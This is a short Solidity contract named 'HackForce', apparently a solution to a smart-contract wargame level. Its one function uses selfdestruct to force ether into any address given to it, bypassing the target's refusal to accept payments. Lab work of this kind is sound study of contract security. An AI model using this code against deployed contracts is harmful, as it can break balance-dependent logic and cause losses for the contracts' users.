pragma solidity ^0.6.0;

contract HackForce {

    function hack(address payable _address) payable public {
        selfdestruct(_address);
    }
}